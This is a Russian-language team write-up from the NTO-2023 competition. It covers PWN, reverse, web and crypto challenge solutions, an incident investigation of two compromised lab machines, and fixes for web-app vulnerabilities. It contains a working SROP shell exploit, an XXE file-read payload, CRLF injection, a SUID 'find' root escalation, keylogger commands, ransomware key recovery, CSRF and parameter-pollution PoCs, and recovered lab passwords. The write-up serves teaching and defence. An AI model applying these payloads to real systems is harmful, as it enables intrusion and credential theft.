# Qualitas incident report НТО-2023
## Выполнили
Команда “Qualitas”:
Шлотов Степан, stepka123456789@yandex.ru
Ярослав Морозов, gorkov-00-00@mail.ru
Герасименко Яна, yanagerasimenko@bk.ru
Ильин Никита, mrthefall@yandex.ru
В ходе работы было проведено расследование инцидента и исправление уязвимости в веб-приложении

## Github
https://github.com/MrTheFall/nto-2023

## Содержание
[TOC]

# Таски

## PWN-10

Для эксплуатации выдан elf файл. У файла отсутвуют такие защиты как стэковая канарейка, RELRO, NX, так же бинарник not PIE .В связи что бинарный файл максимально лишен излинего кода(нету никаких полезных гаджетов) и не линкуется ни с какими библиотеками обычный роп невозможен. Но можно заметить, что syscall read возвращает количество прочитанных байтов. Это дает нам возможность для такой техники как SROP. Мы используем SROP 2 раза: первый раз для того чтобы записать строку /bin/bash на стэк, второй раз чтобы вызвать execve с нужными параметрами. Пример эксплойта ниже.
```python=
from pwn import *
context.arch = 'x86_64'
# p = gdb.debug('./micro', '''
# catch syscall execve
# c
# ''')
p = remote('10.10.19.10', 8888)
#p = process('./micro')
frame2 = SigreturnFrame()
frame2.rax = 0x3b  # syscall number for execve
frame2.rdi = 0x402000 + 128  # pointer to /bin/sh
frame2.rsi = 0x0  # NULL
frame2.rdx = 0x0  # NULL
frame2.rip = 0x40102D  # syscall;ret
frame2.rsp = 0x402000 + 128 + 32
frame2.rbp = 0x402000 + 128

frame = SigreturnFrame()
frame.rax = 0x0  # syscall number for read
frame.rdi = 0x0  # stdin
frame.rsi = 0x402000 + 128  # NULL
frame.rdx = len(b'/bin/sh' + 17 * b'R' + p64(0x40101C) + p64(0x40101C)+ p64(0x40102d) + bytes(frame2) + p64(0x40102d))  # NULL
frame.rip = 0x40102D  # syscall; ret
frame.rsp = 0x402000 + 128 + 32
frame.rbp = 0x402000 + 128


p.send(b'A' * 14 + b'/bin/sh' + b'\x00' * 11 + p64(0x401018) + p64(0x40102D) + bytes(frame))
input()
p.send(b'A' * 15)
input()
p.send(b'/bin/sh' + 17 * b'R' + p64(0x40101C) + p64(0x40101C)+ p64(0x40102d) + bytes(frame2) + p64(0x40102d))
input('LAST')
p.send(b'/bin/sh' + b'\x00' + b'U'*7)
p.interactive()
```
**FLAG:NTO{7h47_w45n7_50_b4d_w45_17}**

## Reverse-10

Для исследования нам выдан exe файл. Понимаем что она содержит dos программу.
Запустив программу понимаем что она просто печатает флаг, но переодично вызывает системное прерывание sleep(опкоды операции CD 15).
Патчим эти опкоды на nop(опкод 90) и получаем флаг после того как запускаем программу в досбоксе.
![](https://i.imgur.com/uksn56f.png)
**FLAG:nto{h3ll0_n3w_5ch00l_fr0m_0ld!!}**

## Reverse-20
В начале работы программы происходит перестановка символов в строке флага по какому-то алгоритму, можно сопоставить индексы символов исходных и перестановленных. Также происходит проверка len(flag)=28
Далее по строкам вида `/home/c3nt/Projects/Olymp_tasks/Old_Times/uni/unicorn/qemu/accel/tcg/cputlb.c` понимаем, что используется эмулятор CPU unicorn. Он имеет открытый исходный код. Используя github, https://unicorn.dpldocs.info и https://hackmd.io/@K-atc/rJTUtGwuW восстанавливаем логику работы кода:
```python=
__int64 __fastcall checkShuffledFlag(__int64 KEy, _QWORD *flagstr)
{
  _QWORD *v2; // rax
  const char *v3; // rax
  _QWORD *v4; // rax
  _QWORD *v5; // rax
  __int64 result; // rax
  int v7; // [rsp+10h] [rbp-20h] BYREF
  int v8[2]; // [rsp+14h] [rbp-1Ch] BYREF
  int v9; // [rsp+1Ch] [rbp-14h]
  unsigned int *uc; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v11; // [rsp+28h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  v8[1] = 0;
  v9 = uc_open(3u, 4, &uc);                     // UC_ARCH_MIPS=3u UC_MODE_LITTLE_ENDIAN 
                                                // UC_MODE_32 = 4
                                                // 
  if ( v9 )
  {
    v2 = sub_1136000(4LL);
    *v2 = 2;
    sub_1137060(v2, &off_168A080, 0LL);
  }
  v9 = uc_mem_map(uc, *(KEy + 12), 2097152LL, 7u);// uc_mem_map(uc, UC_BUG_WRITE_ADDR, size, UC_PROT_ALL)
  v9 = uc_mem_write(uc, *(KEy + 12), *KEy, *(KEy + 8));
  v7 = 0;
  v9 = setReg(uc, 4, &v7);                      // v0 = 0
  v7 = 0x2C2C2C2C;
  v9 = setReg(uc, 6, &v7);                      // a0 = 0x2C2C2C2C
  v7 = *extract4Chars(flagstr, 0LL);
  v9 = setReg(uc, 11, &v7);                     // t1 = 4chars(0)
  v7 = *extract4Chars(flagstr, 1LL);
  v9 = setReg(uc, 12, &v7);                     // t2 = 4chars(1)
  v7 = *extract4Chars(flagstr, 2LL);
  v9 = setReg(uc, 13, &v7);                     // t3 = 4chars(2)
  v7 = *extract4Chars(flagstr, 3LL);
  v9 = setReg(uc, 14, &v7);                     // t4 = 4chars(3)
  v7 = *extract4Chars(flagstr, 4LL);
  v9 = setReg(uc, 15, &v7);                     // t5 = 4chars(4)
  v7 = *extract4Chars(flagstr, 5LL);
  v9 = setReg(uc, 16, &v7);
  v7 = *extract4Chars(flagstr, 6LL);            // t7 = 4chars()
  v9 = setReg(uc, 17, &v7);
  v9 = uc_emu_start(uc, *(KEy + 12), (*(KEy + 12) + *(KEy + 8)), 0LL, -0uLL);
  if ( v9 )
  {
    v3 = uc_strerror(v9);
    v4 = sub_11A9830(qword_17897C0, v3);
    sub_11A81D0(v4, sub_11A9150);
    v5 = sub_1136000(4LL);
    *v5 = 2;
    sub_1137060(v5, &off_168A080, 0LL);
  }
  uc_reg_read(uc, 5, v8);                       // v1 reg
  uc_close(uc);
  result = v8[0];
  if ( v11 != __readfsqword(0x28u) )
    sub_1269330();
  return result;
}
```
В этой функции назначаются регистры t1..t7 виртуального CPU MIPS (32 bit, little endian) байтами флага по 4 символа (4*8 = 32 бита). Дизассемблируем MIPS инструкции и портируем логику для решения с помощью SMT-солвера Z3. Стоит отметить, что из-за необратимости побитового AND есть масса вариантов флага, остаётся выбрать "нужный" (где есть логичные слова, а не рандомные символы). Для любого флага из приведённых ниже программа сообщит об успехе. Для фильтрации используем ограничение на печатаемые символы (достаём их из регистра с помощью & и сдвига, напр `(reg & 0xff000000) >> 24`), кроме того, мы знаем, что последний символ - `}`.
```python=
import string


# nto{Wh0_54id_Th1s_1S_M3d1um} - correct, принято бордой
# nto{Wh0_54id_Th1s_1S_M3d!Um} - бинарник их тоже примет
# nto{Wh0_54id_Th1s_1S_M3d!ul}
# nto{Wh0_54id_Th1s_1S_M3d!um}
# nto{Wh0_54id_Th1s_1S_M3d8Um}
# nto{Wh0_54id_Th1s_1S_M3d8ul}
# nto{Wh0_54id_Th1s_1S_M3d8um}

# b'nto{Wh0_54id_Th1s_1S_M3d0Qt}'
# b'nto{Wh0_54id_Th1s_1S_M3d0Qu}'
# b'nto{Wh0_54id_Th1s_1S_M3d1Pt}'
def trans(trmut):
    forg = '{otndcbahgfe1lki54329876}qp0'
    orig = 'nto{abcdefghikl1234567890pq}'

    res = [b' ' for _ in range(len(trmut))]
    for i in range(len(forg)):
        res[orig.index(forg[i])] = trmut[i]
    return bytes(res)


from z3 import *

t1, t2, t3, t4, t5, t6, t7 = [BitVec(f't{i}', 32) for i in range(1, 7 + 1)]

s = Solver()
s.add(t1 == 0x6e746f7b)

t1 &= 0x2C2C2C2C
s0 = 0x2c24 << 16
s0 = s0 | 0x2c28
s.add(s0 == t1)

t1 ^= t2
s0 = 0x7b4c << 16
s0 = s0 | 0x1c77
s.add(s0 == t1)

t1 ^= t3
s0 = 0x4e78 << 16
s0 = s0 | 0x7513
s.add(s0 == t1)

args = []
for l in string.ascii_letters + string.digits + '_!@+=-':
    args.append((t4 & 0xff) == ord(l))
s.add(Or(*args))
args = []
for l in string.ascii_letters + string.digits + '_!@+=-':
    args.append((t4 & 0xff00) >> 8 == ord(l))
s.add(Or(*args))
args = []
for l in string.ascii_letters + string.digits + '_!@+=-':
    args.append((t4 & 0xff0000) >> 16 == ord(l))
s.add(Or(*args))

args = []
for l in string.ascii_letters + string.digits + '_':
    args.append((t4 & 0xff000000) >> 24 == ord(l))
s.add(Or(*args))

args = []
for l in string.ascii_letters + string.digits + '_!@+=-':
    args.append((t7 & 0xff) == 125)
s.add(Or(*args))
args = []
for l in string.ascii_letters + string.digits + '_!@+=-':
    args.append((t7 & 0xff00) >> 8 == ord(l))
s.add(Or(*args))
args = []
for l in string.ascii_letters + string.digits + '_!@+=-':
    args.append((t7 & 0xff0000) >> 16 == ord(l))
s.add(Or(*args))

args = []
for l in string.ascii_letters + string.digits + '_!@+=-':
    args.append((t7 & 0xff000000) >> 24 == ord(l))
s.add(Or(*args))

s.add(t4 == 1599367217)
t1 &= t4
s0 = 0x4e50 << 16
s0 |= 0x6011
s.add(s0 == t1)

t1 ^= t5
s0 = 0x3d0f << 16
s0 |= 0x5142
s.add(s0 == t1)

t1 ^= t6
s0 = 0x6242 << 16
s0 |= 0x6226
s.add(s0 == t1)

t1 &= t7
s0 = 0x2040 << 16
s0 |= 0x6024

s.add(s0 == t1)
# s.add(t4!=1599432793)
# s.add(t1==int.from_bytes(b'{otn', 'little'))
while True:
    s.check()
    m = s.model()
    # print(m)
    vr = sorted([(d, int(str(m[d])).to_bytes(4, 'little')) for d in m], key=lambda x: str(x[0]))
    # print(vr)
    s.add(t7 != int.from_bytes(vr[-1][1], 'little'))
    bbb = b''
    for v in vr:
        bbb += v[1]
    # print(bbb)
    print(trans(bbb))
```
**FLAG:nto{Wh0_54id_Th1s_1S_M3d1um}**
## Web-10
Приложение общается по вебсокету с бэкендом. Внимание привлекает параметр format. Изменив его на xml, замечаем, что парсинг data происходит по другому, уже не как json, а как xml. Пытаемся закинуть XXE:
```
encrypt(`{"format":"xml","data":"<?xml version=\\"1.0\\" encoding=\\"UTF-8\\" ?><!DOCTYPE netspi [<!ENTITY xxe SYSTEM \\"file:///flag.txt\\" >]><root><format>xml</format><data><countries>CPV</countries><startdate>0111-11-11</startdate><enddate>0011-11-11</enddate><resttype>&xxe;</resttype></data></root>"}`)
```
decrypted response c флагом:
```
'{"format":"xml","data":"<?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?>\\n<!DOCTYPE netspi [\\n<!ENTITY xxe SYSTEM \\"file:///flag.txt\\">\\n]>\\n<root>\\n  <format>xml</format>\\n  <data>\\n    <countries>CPV</countries>\\n    <startdate>0111-11-11</startdate>\\n    <enddate>0011-11-11</enddate>\\n    <resttype>nto{w3bs0ck3ts_plu5_xx3_1s_l0v3}\\n</resttype>\\n    <price>NaN</price>\\n  </data>\\n</root>\\n"}'
```
**FLAG: nto{w3bs0ck3ts_plu5_xx3_1s_l0v3}**

## Web-20

Изучив сурсы данных приложений, понимаем, что уязвимая часть - сырой сокет реквест. В попытках подменить какой-нибудь хедер и добиться ошибки, вставляем в юзернейм clrf байты - **%0d%0** и получаем ошибку с флагом.
```
Bad Request Bare CR or LF found in header line "Cookie: username=aqe %0;flag=NTO{request_smuggling_917a34072663f9c8beea3b45e8f129c5}" (generated by waitress)
```
**FLAG: NTO{request_smuggling_917a34072663f9c8beea3b45e8f129c5}**


## Crypto-10
В задаче идет простое преобразование байта в число. При этом, нет никакого ключа, поэтому мы просто строим соответствие и преобразовываем егог в обратную сторону.

```python=
order = 1337
G = DihedralGroup(order)
padder = 31337
gen = G.gens()[0]
all_gens = G.list()

ct = [277, 92, 775, 480, 160, 92, 31, 586, 277, 801, 355, 489, 801, 31, 62, 926, 725, 489, 160, 92, 31, 586, 277, 801, 355, 489, 1281, 62, 801, 489, 1175, 277, 453, 489, 453, 348, 725, 31, 348, 864, 864, 348, 453, 489, 737, 288, 453, 489, 889, 804, 96, 489, 801, 721, 775, 926, 1281, 631]


def G_pow(element, exponent):
    element = G(element)
    answer = G(())
    aggregator = element
    for bit in bin(int(exponent))[2:][::-1]:
        if bit == '1':
            answer *= aggregator
        aggregator *= aggregator
    return answer


def prepare():
    result = dict()
    for x in range(0x100):
        result[int(all_gens.index(G_pow(gen, x * padder)))] = x
    return result


if __name__ == "__main__":
    prepared = prepare()
    pt = bytes([prepared[x] for x in ct])
    print(pt)
```
**FLAG: nto{5tr4ng3_gr0up_5tr4ng3_l0g_and_depressed_kid_zxc_ghoul}**
# 
## Crypto-20
Сервис возвращает число в диапазоне от n//2 до n (n дано в условии), если запрошенный бит равен 0. Если он равен 1, выполняется операция возведения в степень с рандомным простым числом `getPrime(300)` и берётся остаток от деления на n. Суть решения в том, что остаток может быть меньше n // 2. Отправляем запрос 50 раз для каждого бита и если хотя бы один раз он меньше n //2 то бит=1, иначе 0.
```python=
import requests

NR = 71461210178267241253874180572230672058943918462254505513262953236227938134718209678368057154590422202556893590227567700995975175246765502504256081853245470346336896040132899563871061059499515077101664144171770909013200423807024681526479725791286269762171575299819674488085699345704651404900889747484518347199 // 2


def GU(b):
    for _ in range(50):
        z = requests.get('http://10.10.19.10:1177/guess_bit?bit='+str(b))

        I = int(z.json()["guess"])
        if I < (NR // 2 - 1):
            return True
    return False


for i in range(1,134+1):
    print(int(GU(i)),end='')
```
## Crypto-30
#### Решение
Для решения данной задачи пригодилось использовать https://www.sagemath.org/ (сначала с ним возникали проблемы, т.к. на разных версиях могут не срабатывать некоторые модули)
По условию задания, можно понять, что мы имеем дело с проблемой *дискрет. алгоритма*, а значит нужно двигаться в эту сторону. 
Хорошенько погуглив, находим информацию о существовании  *Pohlig hellman algorithm* (https://ru.wikipedia.org/wiki/%D0%90%D0%BB%D0%B3%D0%BE%D1%80%D0%B8%D1%82%D0%BC_%D0%9F%D0%BE%D0%BB%D0%B8%D0%B3%D0%B0_%E2%80%94_%D0%A5%D0%B5%D0%BB%D0%BB%D0%BC%D0%B0%D0%BD%D0%B0)
Понимаем, что здесь p-1, которое имеет только малые простые делители, оно также называется гладким числом.
Теперь можно взять дис. лог. таким образом.

Т.е. берем число p-1 и раскладываем его на множетели через библиотеку factordb (метод факторизации). Далее, берем дис. лог., т.к. множетели маленькие, а затем, через Chinese Remainder Theorem/CRT (Китайская теорема об остатках - https://math.fandom.com/ru/wiki/%D0%90%D0%BB%D0%B3%D0%BE%D1%80%D0%B8%D1%82%D0%BC_%D0%9F%D0%BE%D0%BB%D0%B8%D0%B3%D0%B0-%D0%A5%D0%B5%D0%BB%D0%BB%D0%BC%D0%B0%D0%BD%D0%B0) берем общий дис. лог.


П.С. - в коде есть комментарии, обозначающие, что означает та или иная функция (общее назначение)
```python=
import ast
from Crypto.Util.number import long_to_bytes
from factordb import factordb
# импорт библиотек


def read_ct():
    with open('data.txt', 'r') as f:
        for line in f:
            yield ast.literal_eval(line)
            # открытие и чтение data.txt

# https://www.ctfnote.com/crypto/rsa/prime-factors
def fdb(x):
    f = factordb.FactorDB(x)
    f.connect()
    # коннект к фактору
    return f.get_factor_list()
    # факторизация через базовый sage модкль


def dislog(f, p, ct):
    F = GF(p, proof=False)
    # Galois field/Конечное поле
    power = p // f
    # целочисл. показат.
    return int(discrete_log(F(ct)^power, F(2)^power, ord=f))
    # дискретное логарифмирование


def main():
    factors, results = [], []
    for x in read_ct():
        p, ct = x['p'], x['shared_flag']
        for f in fdb(p-1):
        # те самые p-1
            if 10 <= f.bit_length() < 20:
                print(f)
                factors.append(f)
                results.append(dislog(f, p, ct))
    pt = crt(results, factors)
    # Китайская теорема об остатках
    print(pt)
    print(long_to_bytes(pt))
    # мэйн функция с выводом результата


if name == '__main__':
    main()

``` 
 
 
**FLAG: nto{d0nt_k33p_secrets}**

# Машина 1
( Пароль с машины был снят изменением конфига граб (... init=/bin/sh) ) 
## Как злоумышленник попал на машину?
Благодаря легенде, можно узнать часть того пути, через которое была совершена атака. Ученик Валера взял флэшку у незнакомца под предлогом скачивания чита на всемирно известную игру Minecraft. Парень решил проверить работу программы на своем ПК, но не вышло, из-за чего он решил запустить ее на рабочем ПК своего отца. Тем не менее, это оказалось актом социальной инженерии: в лаунчере minecraft.jar был подшит реверсшел. (listener атакующего находился по адресу 192.167.126.129:4444)

## Как повысил свои права?
Чтобы найти следы хакерского ПО стоит, перейдя в машину, проверить все файлы, связанные с историями команд, логами программ и подозрительно выглядящими файлами. Они позволят определить цепочку атаки. Такие файлы и команды удалось обнаружить.
1) LinPEAS.sh - скрипт, позволяющий обнаружить возможные пути повышения в системе.
2) SUID binary "find" - мисконфигурация машины, позволившая байпаснуть локальные правила и добиться повышения привилегий.  
```
-rwsr-sr-x 1 root root 282088 Mar 23  2022 /usr/bin/find
sergey@ubuntu-2204:/usr/bin$ ./find . -exec /bin/sh -p \; -quit
# whoami
root
```

![](https://i.imgur.com/7NMIeRb.png)
![](https://i.imgur.com/pTIk5Uh.png)
![](https://i.imgur.com/pUQ6Wye.png)

3) содержимое файлов .bash_history 
```
java -jar minecraft.jar - доказательство, что заражение началось с открытия лаунчера
./logkeys -m en_US_ubuntu_1204.map -s - запуск кейлоггера
cat /var/log/logkeys.log - путь, куда выгружались логи кейлоггера
```

Вывод: открыв файл, Валера запустил вредносное ПО, которое в свою очередь, 
активировало реверс шелл и позволил осуществить бэк-коннект к системе отца героя. Далее, уже сам хакер попал в систему и воспользовался скриптом LinPEAS, чтобы увидеть мисконфиги и уязвимые точки системы. Удалось найти SUID find'а и повыситься до рута, имея все привилегии в пользовании.
```
find / \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \; | grep find
-rwsr-sr-x 1 root root 282088 Mar 23  2022 /usr/bin/find
```

## Как злоумышленник узнал пароль от passwords.kdbx ?

Благодаря кейлоггеру у злоумышленника получилось выкрасть пароль от keepass, установленного на компьютере жертвы.
```
Logging started ...
2023-02-10 07:56:02-0500 > <Enter>1<LShft>_<LShft>D0<LShft>N7<LShft>_<LShft>N0<LShft><#+32><LShft>W<LShft>_<LShft>WHY<LShft>_N07<LShft>_M4y<BckSp><LShft>Y83<LShft>_345<LShft>Y<Up>
```
Keepass password: **1_D0N7_N0W_WHY_N07_M4Y83_345Y**



## Куда logkeys пишет логи ?

`/var/log/logkeys.log` - путь, куда выгружались логи кейлоггера
    
ПРУФ ПУТИ ЛОГА 
![](https://i.imgur.com/mPBlJql.png)
![](https://i.imgur.com/VjJtCMs.png)


## Пароль от чего лежит в passwords.kdbx?

В keepass находился пароль от некоторой windows машины, по видимому, с возможностью подключиться по rdp. Вероятно это обеспечило дальнейшее продвижение злоумышленника в сети жертвы. На скомпроментированной машине была надена Remina - по для RDP/VNC подключений.
Windows rdp password: **SecretP@ss0rdMayby_0rNot&**



.bash_history:
```1  su root
2  ls /home/
3  su root
4  ls
5  keepass2 
6  keepass2
7  ls
8  java -jar minecraft.jar
```



root@ubuntu-2204:~# cat .bash_history 
```chmod +s /usr/bin/find
ls -al /usr/bin/find
shred /root/.bash_history 
ls
cd Downloads/build/src/
ls
./logkeys 
./logkeys -k
cd ..
ls
cd src/
./logkeys -k
cat /var/log/logkeys.log 
./logkeys -k
cat /var/log/logkeys.log 
sudo apt-get install keepass2
keepass2 
userdel -r ubuntu
rm -rf /home/ubuntu/
ls /home/
lsusb 
cd Downloads/build/src/
ls
./logkeys -s
ls
cd ..
ls
cd src/
ls
./logkeys -s -u en_US_ubuntu_1204.map 
./logkeys
./logkeys -s -u en_US_ubuntu_1204.map 
./logkeys
./logkeys --us-keymap en_US_ubuntu_1204.map -s
./logkeys -m en_US_ubuntu_1204.map -s
exit
```

в загрузках был найден linpeas.sh

при открытии mi

![](https://i.imgur.com/4U04R2K.png)
![](https://i.imgur.com/Dr76mXs.png)


https://etp.roseltorg.ru/authentication/login?url=/supplier/auction/index/status/31/proceduretypes/all
это на



./logkeys -k
cat /var/log/logkeys.log 
Благодаря кейлоггеру у злоумышленника получилось выкрасть пароль от keepass, установленного на компьютере жертвы.

Logging started ...
2023-02-10 07:56:02-0500 > <Enter>1<LShft>_<LShft>D0<LShft>N7<LShft>_<LShft>N0<LShft><#+32><LShft>W<LShft>_<LShft>WHY<LShft>_N07<LShft>_M4y<BckSp><LShft>Y83<LShft>_345<LShft>Y<Up>
2023-02-10 07:57:34-0500 > <Enter>
    
Keepass password: 1_D0N7_N0W_WHY_N07_M4Y83_345Y

Windows rdp password: SecretP@ss0rdMayby_0rNot&

got root via suid find
-rwsr-sr-x 1 root root 282088 Mar 23  2022 /usr/bin/find

```
sergey@ubuntu-2204:/usr/bin$ ./find . -exec /bin/sh -p \; -quit
# whoami
root
```
    
# Машина 2

https://www.trendmicro.com/vinfo/ru/threat-encyclopedia/malware/trojan.msil.bladabindi.usxvpjv19
https://xakep.ru/2018/11/28/bladabindi-worm/

    
![](https://i.imgur.com/btw0HPU.jpg)
![](https://i.imgur.com/siDPmgI.png)


    
    
https://www.virustotal.com/gui/file/adf5ca9b1582c69c8833bc611166d6388216c5e7f570bbf9298fd60c37bf72a6/detection

## Какой пароль от Ransomware?
Config.key = "WhenYoullComeHomeIllStopThis"
Config.User = "NTI-User"
Config.IP = 6 7^:'8Z :V\u001A<\u0010!]?\u001E&\u001C1\u001DZ\u001A6ZY\u00054\u0005#]\u0015^/?\r-541\u0010:\u0015"
password = "**084b988baa7c8d98cda90c5fe603c560**"

    
    
## Какие процессы в системе являются вредоносными?
njRAT — троян удаленного доступа. Это один из самых доступных и известных старых RAT. Заинтересованные злоумышленники могут найти целые учебные пособия на YouTube.
О принадлежности этого трояна к njRAT говорит множество сигнатурных анализаторов и песочницы.
Так выглядит графовая структура процессов, созадваемых после запуска Doom.exe
![](https://i.imgur.com/NiP3tYV.png)
Таким образом вредоносными являются:
```
1.Host Process for Windows Tasks.exe
2.Runtime Broker.exe
3.Security Health Service.exe
4.Windows Explorer.exe
```
Исполняемые файлы находятся соответственно по путям:
```
C:\Users\admin\Security Health Service.exe
C:\ProgramData\Windows Explorer.exe
C:\Users\admin\AppData\Local\Temp\Runtime Broker.exe
C:\Users\admin\Security Health Service.exe
```
**Один из экземпляров njRAT находится по пути C:\Users\Administrator\Desktop1.exe**

После дропа и инициализации, каждый из процессов обеспечивает себе доступ во внешнюю сеть, разрешая подключения для себя в фаерволе windows.
Пример:
`netsh firewall add allowedprogram "C:\Users\admin\AppData\Roaming\Host Process for Windows Tasks.exe" "Host Process for Windows Tasks.exe" ENABLE`


    
## Как произошла доставка вредоносного ПО?
С прошлого этапа злоумышленник получил доступ по RDP к атакуемой windows машине, после чего загрузил и запустил VTropia.exe. Таким образом он зашифровал некоторые файлы(не всех форматов, не во всех директориях) на атакуемой машине. Через некоторое время, был загружен Doom.exe, который является дроппером njRAT и открывает постоянный удалённый доступ, так он обеспечил себе закрепление на атакуемом компьютере, корме того так он повысил свою скрытность, так как теперь он больше не зависит от незанятой RDP сессии.
https://support.microsoft.com/en-us/windows/how-malware-can-infect-your-pc-872bf025-623d-735d-1033-ea4d456fb76b
    
## Какие средства обфускации были использованы?
Eziriz net reactor
![](https://i.imgur.com/yAGv0VG.png)

Деобфусцируем
![](https://i.imgur.com/HSP6l2u.png)

## Как злоумышленник нашел учетные данные от Web-сервиса?
В файлах сессии основного браузера на машине были обнаружены попытки просмотреть сохраненные пароли и формы ввода.
    
![](https://i.imgur.com/mH5aXqO.png)
Именно там он и обнаружил сохраненный пароль для веб сайта. Однако, после шифрования системы мы не смогли сразу увидеть эти сохраненные данные, так как они тоже были затронуты шифровальщиком
```
chrome://settings/autofill
chrome://settings/passwords
```
Найденный пароль **P@ssw0rd**

![](https://i.imgur.com/HyFLFNd.png)

![](https://i.imgur.com/0M5krU4.png)

    
МИКРОТИК
Рядом с утилитой для настройки роутеров Mikrotik был найден файл Important.txt.txt. Вероятнее всего пароль содержащийся в текстовом файле был связан с утилитой.
`CSh4RpR@n50mWar3z4ReSti11Us3fUl`



Доказательство, что на компьютере запускалась vtropia.exe
![](https://i.imgur.com/yORQ1mf.png)

Скрипт для декрипта файлов:
    
![](https://i.imgur.com/yCFxLij.png)
    
    
```
    byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] array = Encoding.UTF8.GetBytes(password);
			array = SHA256.Create().ComputeHash(array);
			byte[] bytes = Crypt.AES_Encrypt(bytesToBeEncrypted, array);
			try
			{
				File.WriteAllBytes(file, bytes);
				string str = ".p4blm";
				File.Move(file, file + str);
			}
			catch (UnauthorizedAccessException)
			{
```
    

```csharp=
using System;
using System.Security.Cryptography;
using System.IO;
public class C {
    static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[]
			{
				1,
				8,
				3,
				6,
				2,
				4,
				9,
				7
			};
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
					rijndaelManaged.Mode = CipherMode.CBC;
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
						cryptoStream.Close();
					}
					result = memoryStream.ToArray();
				}
			}
			return result;
		}
    
        static byte[] AES_Decrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[]
			{
				1,
				8,
				3,
				6,
				2,
				4,
				9,
				7
			};
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
					rijndaelManaged.Mode = CipherMode.CBC;
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
						cryptoStream.Close();
					}
					result = memoryStream.ToArray();
				}
			}
			return result;
		}
    public static void Main() {
        //byte[] src = {0x41, 0x42};
        byte[] bytesToBeDecrypted = Convert.FromBase64String("pTuNtGrj6dm400ShIQtUq8IDMWG+zegd9qEpMlsdNEI="); // Important.txt.txt.p4blm
		byte[] array = System.Text.Encoding.UTF8.GetBytes("084b988baa7c8d98cda90c5fe603c560");
		array = SHA256.Create().ComputeHash(array);
        
        //Console.WriteLine(Convert.ToBase64String(AES_Encrypt(src,password)));
        //a2/vWmVfrDfYx+Cwi7ShAA==

        var dbts = AES_Decrypt(bytesToBeDecrypted, array);
        Console.WriteLine(Convert.ToBase64String(dbts));
    }
}
```
    
# Исправление уязвимостей
    
## Уязвимость 1
![](https://i.imgur.com/1BJn3np.png)

Перерегистрация юзера с уже сущ почтой и юзернеймом
Регистрация с любыми данными(почта не чекается по регексу + длина пароля + существовавние юзера) (файл `access.py`)

**Fix: Добавили чек на длину пароля и то, что данный юзер уже существует:**
```python=
def save_to_db(self):
    user = self._connector.db.get_user(self.username)
    if user:
        return False  # user already exist
    if len(self.password) < 8:
        return False  # bad password length
    self._connector.db.new_user(self.username, self.email, self.password, self.admin)
    self._connector.db.set_permissions(self.username, self.__export_permissions(self.permissions))
    return True
```

## Уязвимость 2
Password change account takeover (смешались параметры GET и POST запросов):
```python
def change_password():
    user = connector.db.get_user(session["user"])
    if int(user["uid"]) != int(request.form.get('user_id')) and not user["admin"]:
        return make_response({"error":"Access denied"}, 403)
    user_id = request.values.get('user_id')
```
POC: 
```
POST /change_password?user_id=7
...
user_id=1&password=321    
```

Fix:
```python=
@app.route('/change_password', methods=['POST'])
def change_password():
    user = connector.db.get_user(session["user"])
    if int(user["uid"]) != int(request.form.get('user_id')) and not user["admin"]:
        return make_response({"error": "Access denied"}, 403)
    user_id = request.form.get('user_id')
    password = request.form.get('password')
    if connector.db.change_password(user_id, password):
        return make_response({"status": "ok"}, 200)
    else:
        return make_response({"error": "Same password"}, 400)
```
Убираем вариант запроса с GET, чтобы не дублировать функциональность (на фронтенде POST, да он и логичнее на смену пароля). Берём значения для проверки из `request.form`.
    
    
    
## Уязвимость 3 
Методом исправления является - CORS Origin header, который позволяет выстроить ограничения на запросы различных доменов.
Также, существуют и другие альтернативы:
1) Хэдер X-CSRF-Token, который устанавливает cookie раз в сессию, он работает потому, что вставляется только в клиентский JS.
2) Same Origin Policy, которое проверяет два URL'а и считает имеющим один источник,только если у них одинаковый протокол, домен и порт
3) Double Submit Cookie, идея которого в том, чтобы отдать токен клиенту двумя методами: в куках и в одном из параметров ответа.
https://habr.com/ru/post/318748/

**CSRF account takeover:**
```
<html><form enctype="multipart/form-data" method="POST" action="http://10.10.19.110:8080/change_password"><table><tr><td>user_id</td><td><input type="text" value="1" name="user_id"></td></tr>
<tr><td>password</td><td><input type="text" value="321" name="password"></td></tr>
</table><input type="submit" value="http://10.10.19.110:8080/change_password"></form></html>
```
    
Fix:
```python=
class CORSMiddleware(BaseHTTPMiddleware):
    def __init__(self):
        super().__init__()

    def dispatch(self, request, call_next):
        if request.method == 'OPTIONS':
            response = call_next(request)
            response.headers.add("Access-Control-Allow-Origin", "null")
            return response
        if 'Origin' in request.headers:
            if request.headers['Origin'] == 'http://10.10.19.110:8080':
                response = call_next(request)
                return response
            else:
                return make_response({"error": "CORS BAN!"}, 403)
